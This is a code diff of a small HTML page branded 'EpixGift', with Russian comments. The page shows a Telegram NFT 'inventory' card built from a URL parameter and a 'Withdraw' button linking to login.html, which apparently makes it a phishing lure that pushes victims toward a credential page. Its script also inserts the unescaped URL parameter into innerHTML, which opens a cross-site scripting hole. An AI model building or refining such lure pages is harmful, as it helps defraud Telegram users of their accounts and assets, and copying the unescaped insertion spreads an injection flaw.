@@ -3,121 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EpixGift Inventory</title>
-    
-    <meta property="og:title" content="EpixGift Inventory">
-    <meta property="og:image" content="https://t.me/i/nft/MoonPendant-40664.jpg">
-
+    <title>EpixGift</title>
     <style>
         body {
             background-color: #0e141b;
             color: white;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            margin: 0; padding: 16px;
-            overflow-x: hidden;
+            margin: 0; padding: 15px;
         }
         .header {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 20px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid #1c252f;
+            font-size: 20px; font-weight: bold;
+            margin-bottom: 20px; border-bottom: 1px solid #1c252f; padding-bottom: 10px;
         }
         .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
+            display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
         }
         .nft-card {
-            background: #1c252f;
-            border-radius: 16px;
-            padding: 12px;
-            border: 1px solid #2a3644;
-            display: flex;
-            flex-direction: column;
-            animation: fadeIn 0.4s ease-out;
+            background: #1c252f; border-radius: 15px; padding: 10px;
+            border: 1px solid #2a3644; text-align: center;
         }
         .nft-card img {
-            width: 100%;
-            aspect-ratio: 1/1;
-            border-radius: 12px;
-            margin-bottom: 10px;
-            object-fit: cover;
-            background: #0e141b;
+            width: 100%; aspect-ratio: 1/1; border-radius: 10px;
+            margin-bottom: 8px; object-fit: cover; background: #000;
         }
-        .nft-title {
-            font-weight: 600;
-            font-size: 14px;
-            margin-bottom: 4px;
-            color: #ffffff;
-        }
-        .nft-sub {
-            font-size: 12px;
-            color: #8a99a8;
-            margin-bottom: 14px;
-        }
+        .nft-title { font-size: 13px; font-weight: bold; margin-bottom: 4px; }
+        .nft-sub { font-size: 11px; color: #8a99a8; margin-bottom: 10px; }
         .btn-withdraw {
-            background: #248bdf;
-            color: white;
-            text-decoration: none;
-            text-align: center;
-            font-size: 13px;
-            font-weight: 600;
-            padding: 10px 0;
-            border-radius: 10px;
-            transition: opacity 0.2s;
+            display: block; background: #248bdf; color: white;
+            text-decoration: none; font-size: 12px; font-weight: bold;
+            padding: 8px 0; border-radius: 8px;
         }
-        .btn-withdraw:active { opacity: 0.7; }
-
-        .empty-state {
-            display: none;
-            text-align: center;
-            color: #8a99a8;
-            margin-top: 50%;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        .empty { text-align: center; color: #8a99a8; margin-top: 50px; display: none; }
     </style>
 </head>
 <body>
     <div class="header">EpixGift</div>
-    
-    <div class="grid" id="nft-grid"></div>
-    <div id="empty-msg" class="empty-state">Your inventory is empty.</div>
+    <div class="grid" id="main-grid"></div>
+    <div id="empty-info" class="empty">Your inventory is empty.</div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const grid = document.getElementById('nft-grid');
-            const msg = document.getElementById('empty-msg');
+        (function() {
+            const grid = document.getElementById('main-grid');
+            const emptyMsg = document.getElementById('empty-info');
             
-            // Очищаем сетку перед началом (исправляет дубликаты)
-            grid.innerHTML = '';
+            // Очистка от старых данных
+            grid.innerHTML = "";
 
-            const urlParams = new URLSearchParams(window.location.search);
-            const itemID = urlParams.get('item');
+            const params = new URLSearchParams(window.location.search);
+            const id = params.get('item');
 
-            if (itemID) {
-                // Создаем карточку только если есть ID
+            if (id) {
+                emptyMsg.style.display = 'none';
                 const card = document.createElement('div');
                 card.className = 'nft-card';
-
-                const displayTitle = itemID.replace(/-/g, ' #');
-                // Используем правильный путь к картинке Telegram
-                const imgUrl = `https://t.me/i/nft/${itemID}.jpg`;
+                
+                // Формируем красивый заголовок
+                const title = id.replace(/-/g, ' #');
+                // Картинка из Telegram NFT API
+                const img = `https://t.me/i/nft/${id}.jpg`;
 
                 card.innerHTML = `
-                    <img src="${imgUrl}" alt="NFT" onerror="this.src='https://via.placeholder.com/200/1c252f/ffffff?text=NFT'">
-                    <div class="nft-title">${displayTitle}</div>
+                    <img src="${img}" onerror="this.src='https://via.placeholder.com/150/1c252f/ffffff?text=NFT'">
+                    <div class="nft-title">${title}</div>
                     <div class="nft-sub">Collectible</div>
                     <a href="login.html" class="btn-withdraw">Withdraw</a>
                 `;
                 grid.appendChild(card);
             } else {
-                msg.style.display = 'block';
+                emptyMsg.style.display = 'block';
             }
-        });
+        })();
     </script>
 </body>
 </html>
